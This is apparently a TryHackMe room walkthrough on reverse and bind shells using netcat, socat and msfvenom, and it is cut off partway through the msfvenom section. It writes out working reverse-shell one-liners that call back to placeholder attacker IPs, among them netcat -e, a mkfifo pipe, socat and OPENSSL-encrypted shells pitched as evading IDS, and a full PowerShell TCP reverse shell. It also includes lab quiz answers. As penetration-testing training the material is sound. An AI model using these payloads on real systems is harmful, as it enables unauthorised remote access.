# TryHackMe walkthrough

## What the Shell?

> _tihawk | May 13, 2021_

----------------------------------------

### TASK 1. What is a shell?

<p>Before we can get into the intricacies of sending and receiving shells, it's important to understand what a shell actually <i>is. </i>In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI). In other words, the common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows. When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target.</p><p>In simple terms, we can force the remote server to either send us command line access to the server (a <b>reverse </b>shell), or to open up a port on the server which we can connect to in order to execute further commands (a <b>bind</b> shell).</p><p>We will be covering both of these scenarios in further detail throughout the room.</p><p>The format of this room is as follows:</p><ul><li>The bulk of the room is made up of information, with examples given in code blocks and screenshots.</li><li>There are two VMs -- one Linux, one Windows -- in the last two tasks of the room. These can be used to practice the techniques demonstrated.</li><li>There are example practice questions in Task 13. Feel free to work through these, or follow along with the tasks as you complete them.</li></ul><p>Without further ado, let's begin!<br /></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Read and understand the introduction.

```
OK
```

----------------------------------------

### TASK 2. Tools

<p>There are a variety of tools that we will be using to receive reverse shells and to send bind shells. In general terms, we need malicious shell code, as well as a way of interfacing with the resulting shell. We will discuss each of these briefly below:</p><p></p><hr /><p></p><p><u><b>Netcat:</b></u></p><p>Netcat is the traditional "Swiss Army Knife" of networking. It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, but more importantly for our uses, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by techniques that we will be covering in an upcoming task.<br /></p><p><b><u>Socat:</u></b></p><p>Socat is like netcat on steroids. It can do all of the same things, and <i>many</i> more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however, there are two big catches:</p><ol><li>The syntax is more difficult</li><li>Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.</li></ol><p>There are work arounds to both of these problems, which we will cover later on. </p><p>Both Socat and Netcat have .exe versions for use on Windows.<br /></p><p><u><b>Metasploit -- multi/handler:</b></u></p><p>The <code>auxiliary/multi/handler</code> module of the Metasploit framework is, like socat and netcat, used to receive reverse shells. Due to being part of the Metasploit framework, multi/handler provides a fully-fledged way to obtain stable shells, with a wide variety of further options to improve the caught shell. It's also the only way to interact with a <i>meterpreter</i> shell, and is the easiest way to handle <i>staged</i> payloads -- both of which we will look at in task 9.</p><p><u><b>Msfvenom:</b></u></p><p>Like multi/handler, msfvenom is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly. Whilst msfvenom can generate payloads other than reverse and bind shells, these are what we will be focusing on in this room. Msfvenom is an incredibly powerful tool, so we will go into its application in much more detail in a dedicated task.</p><hr /><p>Aside from the tools we've already covered, there are some repositories of shells in many different languages. One of the most prominent of these is <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank">Payloads all the Things</a>. The PentestMonkey <a href="https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank">Reverse Shell Cheatsheet</a> is also commonly used. In addition to these online resources, Kali Linux also comes pre-installed with a variety of webshells located at <code>/usr/share/webshells</code>. The <a href="https://github.com/danielmiessler/SecLists" target="_blank">SecLists repo</a>, though primarily used for wordlists, also contains some very useful code for obtaining shells.<br /></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Read the above and check out the links!

```
OK
```

----------------------------------------

### TASK 3. Types of Shell

<p></p><p>At a high level, we are interested in two kinds of shell when it comes to exploiting a target: Reverse shells, and bind shells. </p><ul><li><b>Reverse shells</b> are when the target is forced to execute code that connects <i>back</i> to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a <i>listener</i> which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. This, however, will not be a problem on the TryHackMe network due to the method by which we connect into the network.</li><li><b>Bind shells</b> are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.</li></ul><p>As a general rule, reverse shells are easier to execute and debug, however, we will cover both examples below. Don't worry too much about the syntax here: we will be looking at it in upcoming tasks. Instead notice the difference between reverse and bind shells in the following simulations.<br /></p><hr /><p><i><u>Reverse Shell example:</u></i><br /></p><p>Let's start with the more common reverse shell.</p><p>Nine times out of ten, this is what you'll be going for -- especially in CTF challenges like those of TryHackMe.<br /></p><p>Take a look at the following image. On the left we have a reverse shell listener -- this is what receives the connection. On the right is a simulation of sending a reverse shell. In reality, this is more likely to be done through code injection on a remote website or something along those lines. Picture the image on the left as being your own computer, and the image on the right as being the target.</p><p>On the attacking machine:</p><p><code>sudo nc -lvnp 443</code><br /></p><p>On the target:</p><p><code>nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash</code><br /></p><p><img style="width:1046px" src="https://i.imgur.com/rN7YkJJ.png" /><br /></p><p>Notice that after running the command on the right, the listener receives a connection. When the whoami command is run, we see that we are executing commands as the target user. The important thing here is that we are <i>listening</i> on our own attacking machine, and sending a connection <i>from </i>the target.<br /></p><i><u>Bind Shell example:</u></i><p></p><p>Bind shells are less common, but still very useful. </p><p>Once again, take a look at the following image. Again, on the left we have the attacker's computer, on the right we have a simulated target. Just to shake things up a little, we'll use a Windows target this time. First, we start a listener on the target -- this time we're also telling it to execute <code>cmd.exe</code>. Then, with the listener up and running, we connect from our own machine to the newly opened port.</p><p>On the target:</p><p><code>nc -lvnp &lt;port&gt; -e "cmd.exe"</code><br /></p><p>On the attacking machine:</p><p><code>nc MACHINE_IP &lt;port&gt;</code><br /></p><p><img style="width:1046px" src="https://i.imgur.com/6GUwZsw.png" /><span style="background-color:rgb(255, 255, 0)"><br /></span></p><p>As you can see, this once again gives us code execution on the remote machine. Note that this is not specific to Windows.</p><p>The important thing to understand here is that we are <i>listening</i> on the target, then connecting to it with our own machine.<br /><i></i></p><p></p><hr /><p></p><p>The final concept which is relevant in this task is that of interactivity. Shells can be either <i>interactive</i> or <i>non-interactive</i>. </p><ul><li><i>Interactive:</i> If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to<br />interactive shells. These allow you to interact with programs after executing them. For example, take the SSH login prompt:<br /><img style="width:621px" src="https://i.imgur.com/0ayLj8L.png" /><br />Here you can see that it's asking <i>interactively</i> that the user type either yes or no in order to continue the connection. This is an interactive program, which requires an interactive shell in order to run.<br /><br /><br /></li><li><i>Non-Interactive</i> shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. Let's see what happens when we try to run SSH in a non-interactive shell:<br /><img style="width:492px" src="https://i.imgur.com/rXyEDKU.png" /><br />Notice that the <code>whoami</code> command (which is non-interactive) executes perfectly, but the <code>ssh</code> command (which <i>is </i>interactive) gives us no output at all. As an interesting side note, the output of an interactive command <i>does</i> go somewhere, however, figuring out <b>where</b> is an exercise for you to attempt on your own. Suffice to say that interactive programs do not work in non-interactive shells. </li></ul><p>Additionally, in various places throughout this task you will see a command in the screenshots called <code>listener</code>. This command is an alias unique to the attacking machine used for demonstrations, and is a shorthand way of typing <code>sudo rlwrap nc -lvnp 443</code>, which will be covered in upcoming tasks. It will <i>not</i> work on any other machine unless the alias has been configured locally.<br /></p><p></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Which type of shell connects back to a listening port on your computer, Reverse (R) or Bind (B)?

```
R
```

2. You have injected malicious shell code into a website. Is the shell you receive likely to be interactive? (Y or N)

```
N
```

3. When using a bind shell, would you execute a listener on the Attacker (A) or the Target (T)?

```
T
```

----------------------------------------

### TASK 4. Netcat

<p>As mentioned previously, Netcat is the most basic tool in a pentester's toolkit when it comes to any kind of networking. With it we can do a wide variety of interesting things, but let's focus for now on shells.</p><p><u><i>Reverse Shells</i></u></p><p>In the previous task we saw that reverse shells require shellcode and a listener. There are <i>many</i> ways to execute a shell, so we'll start by looking at listeners.</p><p>The syntax for starting a netcat listener using Linux is this:</p><p><code>nc -lvnp &lt;port-number&gt;</code></p><ul><li><b>-l</b> is used to tell netcat that this will be a listener</li><li><b>-v</b> is used to request a verbose output</li><li><b>-n</b> tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.</li><li><b>-p </b>indicates that the port specification will follow.</li></ul><p>The example in the previous task used port 443. Realistically you could use any port you like, as long as there isn't already a service using it. Be aware that if you choose to use a port below 1024, you will need to use <code>sudo</code> when starting your listener. That said, it's often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.</p><p>A working example of this would be:</p><p><code>sudo nc -lvnp 443</code><br /></p><p>We can then connect back to this with any number of payloads, depending on the environment on the target.</p><p>An example of this is displayed in the previous task.<br /></p><p><u><i>Bind Shells</i></u></p><p>If we are looking to obtain a bind shell on a target then we can assume that there is already a listener waiting for us on a chosen port of the target: all we need to do is connect to it. The syntax for this is relatively straight forward:</p><p><code>nc &lt;target-ip&gt; &lt;chosen-port&gt;</code></p><p>Here we are using netcat to make an outbound connection to the target on our chosen port.</p><p>We will look at using netcat to create a listener for this type of shell in Task 8. What's important here is that you understand how to connect to a listening port using netcat.<br /></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. Which option tells netcat to listen?

```
-l
```

2. How would you connect to a bind shell on the IP address: 10.10.10.11 with port 8080?

```
nc 10.10.10.11 8080
```

----------------------------------------

### TASK 5. Netcat Shell Stabilisation

<p>Ok, so we've caught or connected to a netcat shell, what next?</p><p>These shells are very unstable by default. Pressing Ctrl + C kills the whole thing. They are non-interactive, and often have strange formatting errors. This is due to netcat "shells" really being processes running <i>inside</i> a terminal, rather than being bonafide terminals in their own right. Fortunately, there are many ways to stabilise netcat shells on Linux systems. We'll be looking at three here. Stabilisation of Windows reverse shells tends to be significantly harder; however, the second technique that we'll be covering here is particularly useful for it.<br /></p><hr /><p><u><i>Technique 1: Python<br /></i></u></p><p>The first technique we'll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default. This is a three stage process:</p><ol><li>The first thing to do is use <code>python -c 'import pty;pty.spawn("/bin/bash")'</code>, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace <code>python</code> with <code>python2</code> or <code>python3</code> as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.</li><li>Step two is: <code>export TERM=xterm</code> -- this will give us access to term commands such as <code>clear</code>. </li><li>Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use <code>stty raw -echo; fg</code>. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process. </li></ol><p>The full technique can be seen here:</p><p><img style="width:664px" src="https://i.imgur.com/bQnFz1T.png" /></p><p>Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type <code>reset</code> and press enter.<br /></p><hr /><p><u><i>Technique 2: rlwrap</i></u></p><p>rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell<i>; </i>however, s<i>ome </i>manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with <code>sudo apt install rlwrap</code>.</p><p>To use rlwrap, we invoke a slightly different listener:</p><p><code>rlwrap nc -lvnp &lt;port&gt;</code><br /></p><p>Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use <code>stty raw -echo; fg</code> to stabilise and re-enter the shell. <br /></p><hr /><p> <u><i>Technique 3: Socat</i></u><br /></p><p>The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true" target="_blank">socat static compiled binary</a> (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (<code>sudo python3 -m http.server 80</code>), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (<code>wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat</code>). </p><p>For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (<code>Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile C:\\Windows\temp\socat.exe</code>). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks. </p><hr /><p>With any of the above techniques, it's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.</p><p>First, open another terminal and run <code>stty -a</code>. This will give you a large stream of output. Note down the values for "rows" and columns:</p><p><img style="width:995px" src="https://i.imgur.com/7aOKtlO.png" /></p><p>Next, in your reverse/bind shell, type in:</p><p><code>stty rows &lt;number&gt;</code><br /></p><p>and</p><p><code>stty cols &lt;number&gt;</code><br /></p><p>Filling in the numbers you got from running the command in your own terminal.</p><p>This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.<br /></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. How would you change your terminal size to have 238 columns?

```
stty cols 238
```

2. What is the syntax for setting up a Python3 webserver on port 80?

```
sudo python3 -m http.server 80
```

----------------------------------------

### TASK 6. Socat

<p>Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is as a connector between two points. In the interests of this room, this will essentially be a listening port and the keyboard, however, it could also be a listening port and a file, or indeed, two listening ports. All socat does is provide a link between two points -- much like the portal gun from the Portal games!</p><p>Once again, let's start with reverse shells.</p><p><u><i>Reverse Shells</i></u></p><p>As mentioned previously, the syntax for socat gets a lot harder than that of netcat. Here's the syntax for a basic reverse shell listener in socat:<br /></p><p><code>socat TCP-L:&lt;port&gt; -</code><br /></p><p>As always with socat, this is taking two points (a listening port, and standard input<span style="background-color:rgb(255, 255, 0)"></span>) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to <code>nc -lvnp &lt;port&gt;</code>.</p><p>On Windows we would use this command to connect back:</p><p><code>socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:powershell.exe,pipes</code><br /></p><p>The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.<br /></p><p>This is the equivalent command for a Linux Target:</p><p><code>socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:"bash -li"</code><br /></p><p><i><u>Bind Shells</u></i></p><p>On a Linux target we would use the following command:</p><p><code>socat TCP-L:&lt;PORT&gt; EXEC:"bash -li"</code><br /></p><p>On a Windows target we would use this command for our listener:</p><p><code>socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes</code><br /></p><p>We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.<br /></p><p>Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.</p><p><code>socat TCP:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt; -</code><i><u><br /></u></i></p><hr /><p>Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux, but is <i>significantly </i>more stable. As mentioned earlier, socat is an incredibly versatile tool; however, the following technique is perhaps one of its most useful applications. Here is the new listener syntax:<br /></p><p><code>socat TCP-L:&lt;port&gt; FILE:`tty`,raw,echo=0</code> <br /></p><p>Let's break this command down into its two parts. As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are allocating a new <i>tty</i>, and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, <code>stty raw -echo; fg</code> trick with a netcat shell -- with the added bonus of being immediately stable and allocating a full tty.</p><p>The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true" target="_blank">precompiled socat binary</a>, which can then be executed as normal.</p><p>The special command is as follows:</p><p><code>socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:"bash -li",pty,stderr,sigint,setsid,sane</code><br /></p><p>This is a handful, so let's break it down.</p><p>The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  <code>EXEC:"bash -li"</code>. We're also passing the arguments: pty, stderr, sigint, setsid and sane:</p><ul><li><b>pty</b>, allocates a pseudoterminal on the target -- part of the stabilisation process</li><li><b>stderr</b>, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)<br /></li><li><b>sigint</b>, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell</li><li><b>setsid</b>, creates the process in a new session</li><li><b>sane</b>, stabilises the terminal, attempting to "normalise" it.</li></ul><p>That's a lot to take in, so let's see it in action.</p><p>As normal, on the left we have a listener running on our local attacking machine, on the right we have a simulation of a compromised target, running with a non-interactive shell. Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left:</p><p><img style="width:1046px" src="https://i.imgur.com/etAuYzz.png" /></p><p>Note that the socat shell is fully interactive, allowing us to use interactive commands such as SSH. This can then be further improved by setting the stty values as seen in the previous task, which will let us use text editors such as Vim or Nano.</p><hr /><p>If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding <code>-d -d</code> into the command. This is very useful for experimental purposes, but is not usually necessary for general use.<br /></p>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. How would we get socat to listen on TCP port 8080?

```
TCP-L:8080
```

----------------------------------------

### TASK 7. Socat Encrypted Shells

<p>One of the many great things about socat is that it's capable of creating encrypted shells -- both bind and reverse. Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.<br /></p><p>We covered how to create basic shells in the previous task, so that syntax will not be covered again here. Suffice to say that any time <code>TCP</code> was used as part of a command, this should be replaced with <code>OPENSSL</code> when working with encrypted shells. We'll cover a few examples at the end of the task, but first let's talk about certificates. </p><p>We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:</p><p>

  
  
  
  
  

</p><div><code>openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</code><br /><br />This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.<br /></div><div>We then need to merge the two created files into a single <code>.pem</code> file:</div><div><br /></div><div><code>cat shell.key shell.crt &gt; shell.pem</code><br /></div><div><br /></div><div>Now, when we set up our reverse shell listener, we use:</div><div><br /></div><div><code>socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 -</code><br /></div><div><br /></div><div>This sets up an OPENSSL listener using our generated certificate. <code>verify=0</code> tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate <u><i>must</i></u> be used on whichever device is listening.<br /></div><div><br /></div><div>To connect back, we would use:</div><div><br /></div><div><code>socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=0 EXEC:/bin/bash</code><br /></div><div><br /></div><div>The same technique would apply for a bind shell:</div><div><br /></div><div>Target:</div><div><br /></div><div><code>socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes</code><br /></div><div><br /></div><div>Attacker:</div><div><br /></div><div><code>socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 -</code><br /></div><div><br /></div><div>Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.</div><div><br /></div><div>The following image shows an OPENSSL Reverse shell from a Linux target. As usual, the target is on the right, and the attacker is on the left:</div><div><img style="width:1046px" src="https://i.imgur.com/UbOPN9q.png" /><br /></div><br /><div>This technique will also work with the special, Linux-only TTY shell covered in the previous task -- figuring out the syntax for this will be the challenge for this task. Feel free to use the Linux Practice box (deployable at the end of the room) to experiment if you're struggling to obtain the answer.<br /></div>

----------------------------------------

### QUESTIONS:

----------------------------------------

1. What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"

```
```

2. If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?

```
```

----------------------------------------

### TASK 8. Common Shell Payloads

<p>We'll soon be looking at generating payloads with msfvenom, but before we do that, let's take a look at some common payloads using the tools we've already covered.<br /></p><hr /><p>A previous task mentioned that we'd be looking at some ways to use netcat as a listener for a bindshell, so we'll start with that. In some versions of netcat (including the <code>nc.exe</code> Windows version included with Kali at <code>/usr/share/windows-resources/binaries</code>, and the version used in Kali itself: <code>netcat-traditional</code>) there is a <code>-e</code> option which allows you to execute a process on connection. For example, as a listener:</p><p><code>nc -lvnp &lt;PORT&gt; -e /bin/bash</code><br /></p><p>Connecting to the above listener with netcat would result in a bind shell on the target.</p><p>Equally, for a reverse shell, connecting back with <code>nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash</code> would result in a reverse shell on the target.<br /></p><p>However, this is not included in most versions of netcat as it is widely seen to be very insecure (funny that, huh?). On Windows where a static binary is nearly always required anyway, this technique will work perfectly. On Linux, however, we would instead use this code to create a listener for a bind shell:</p><p><code>mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</code><br /></p><p>The following paragraph is the technical explanation for this command. It's slightly above the level of this room, so don't worry if it doesn't make much sense for now -- the command itself is what matters. </p><blockquote><p><i>The command first creates a <a href="https://www.linuxjournal.com/article/2156" target="_blank">named pipe</a> at <code>/tmp/f</code>. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into <code>sh</code>, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.</i></p></blockquote><p><img style="width:1076px" src="https://i.imgur.com/se5Fyn3.png" /><br /></p><p>A very similar command can be used to send a netcat reverse shell:</p><p><code>mkfifo /tmp/f; nc &lt;LOCAL-IP&gt; &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</code><br /></p><p>This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax.</p><p><img style="width:1076px" src="https://i.imgur.com/Xf0hA5p.png" /><br /></p><hr /><p>When targeting a modern Windows Server, it is very common to require a Powershell reverse shell, so we'll be covering the standard one-liner PSH reverse shell here.<br /></p><p>This command is very convoluted, so for the sake of simplicity it will not be explained directly here. It is, however, an extremely useful one-liner to keep on hand:</p><p><code>powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<b>&lt;ip&gt;</b>',<b>&lt;port&gt;</b>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code><br /></p><p>In order to use this, we need to replace "&lt;IP&gt;" and "&lt;port&gt;" with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell:</p><p><img style="width:1008px" src="https://i.imgur.com/T6o7kOL.png" /></p><hr />For other common reverse shell payloads, <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank">Payloads all the Things</a> is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting), in many different languages. It is well worth reading through the linked page to see what's available.<br />

----------------------------------------

### QUESTIONS:

----------------------------------------

1. What command can be used to create a named pipe in Linux?

```
```

2. Look through the linked Payloads all the Things Reverse Shell Cheatsheet and familiarise yourself with the languages available.

```
```

----------------------------------------

### TASK 9. msfvenom

<p></p><p></p><p><span style="background-color:inherit">Msfvenom: the one-stop-shop for all things payload related.</span></p><p><span style="background-color:inherit">Part of the Metasploit framework, msfvenom is used to generate code for, primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; however, it can also be used to generate payloads in various formats (e.g. </span><code>.exe</code><span style="background-color:inherit">, </span><code>.aspx</code><span style="background-color:inherit">, </span><code>.war</code><span style="background-color:inherit">, </span><code>.py</code><span style="background-color:inherit">). It's this latter function that we will be making use of in this room. There is more to teach about msfvenom than could ever be fit into a single room, let alone a single task, so the following information will be a brief introduction to the concepts that will prove useful for this room.<br /></span></p><p><span style="background-color:inherit">The standard syntax for msfvenom is as follows:</span></p><p><code>msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;</code><span style="background-color:inherit"><br /></span></p><p><span style="background-color:inherit">For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:</span></p><p><code>msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lt;listen-IP&gt; LPORT=&lt;listen-port&gt;</code><span style="background-color:inherit"><br /></span></p><p><img style="width:852px" src="https://i.imgur.com/JkWeFLq.png" /><span style="background-color:inherit"><br /></span></p>Here we are using a payload and four options:<p></p><ul><li><b>-f</b> &lt;format&gt;</li><ul><li>Specifies the output format. In this case that is an executable (exe)</li></ul><li><b>-o </b>&lt;file&gt;</li><ul><li>The output location and filename for the generated payload.</li></ul><li><b>LHOST=</b>&lt;IP&gt;</li><ul><li>Specifies the IP to connect back to. When using TryHackMe, this will be your <a href="http://10.10.10.10" target="_blank">tun0 IP address</a>. If you cannot load the link then you are not <a href="https://tryhackme.com/room/welcome" target="_blank">connected to the VPN</a>.</li></ul><li><b>LPORT=</b>&lt;port&gt;</li><ul><li>The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.<br /></li></ul></ul><hr /><p><span style="background-color:inherit"><i><u>Staged vs Stageless</u></i><br /></span></p><p><span style="background-color:inherit">Before we go any further, there are another two concepts which must be introduced: <i><b>staged</b></i> reverse shell payloads and <i><b>stageless</b></i> reverse shell payloads. </span></p><ul><li><span style="background-color:inherit"><i><b>Staged</b></i> payloads are sent in two parts. The first part is called the <i>stager</i>. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and downloads the actual payload. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.  <br /></span></li><li><span style="background-color:inherit"><i><b>Stageless</b></i> payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.</span></li></ul><p><span style="background-color:inherit">Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discovery and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by antivirus software.</span></p><hr /><p><span style="background-color:inherit"><i><u>Meterpreter</u></i><br /></span></p><p><span style="background-color:inherit">On the subject of Metasploit, another important thing to discuss is a <i>Meterpreter</i> shell. Meterpreter shells are Metasploit's own brand of fully-featured shell. They are completely stable, making them a very good thing when working with Windows targets. They also have a lot of inbuilt functionality of their own, such as file uploads and downloads. If we want to use any of Metasploit's post-exploitation tools then we <i>need</i> to use a meterpreter shell, however, that is a topic for <a href="https://tryhackme.com/room/rpmetasploit" target="_blank">another time</a>. The downside to meterpreter shells is that they <i>must</i> be caught in Metasploit. They are also banned from certain certification examinations, so it's a good idea to learn alternative methodologies.<br /></span></p><hr /><p><span style="background-color:inherit"><i><u>Payload Naming Conventions</u></i></span></p><p><span style="background-color:inherit">When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:</span></p><p><code>&lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt;</code><span style="background-color:inherit"><br /><u></u><i><u></u></i><br /></span>For example:</p><p><code>linux/x86/shell_reverse_tcp</code><br /></p><p>This would generate a stageless reverse shell for an x86 Linux target. </p><p>The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:</p><p><code>windows/shell_reverse_tcp<br /></code><br /></p><p>For a 64bit Windows target, the arch would be specified as normal (x64).</p><p>Let's break the payload section down a little further.</p>In the above examples the payload used was <code>shell_reverse_tcp</code>. This indicates that it was a <i>stageless</i> payload. How? Stageless payloads are denoted with underscores (<code>_</code>). The staged equivalent to this payload would be:<p></p><p><code>shell/reverse_tcp</code><br /></p><p>As staged payloads are denoted with another forward slash (<code>/</code>).</p><p>This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:</p><p><code>windows/x64/meterpreter/reverse_tcp</code><br /></p><p>A Linux 32bit stageless Meterpreter payload would look like 